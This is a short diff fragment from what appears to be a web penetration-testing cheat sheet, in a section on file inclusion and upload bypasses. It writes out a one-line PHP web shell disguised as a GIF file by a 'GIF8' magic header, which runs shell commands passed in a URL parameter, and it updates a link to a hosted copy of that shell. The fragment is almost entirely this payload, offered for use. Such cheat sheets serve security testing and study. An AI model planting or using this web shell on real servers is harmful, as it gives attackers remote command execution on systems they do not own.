@@ -641,8 +641,8 @@ preg_match('/^\.\/okay\/.+$/', $_GET['file'])
 
 -> gif
 
-`echo 'GIF8\<?php system($_GET["cmd"]); ?>' > ok.gif'`  
-/codes/lfi/ok.gif
+`echo 'GIF8\<?php system($_GET["cmd"]); ?>' > ok.gif'`    
+https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif
 
 -> Zip
 
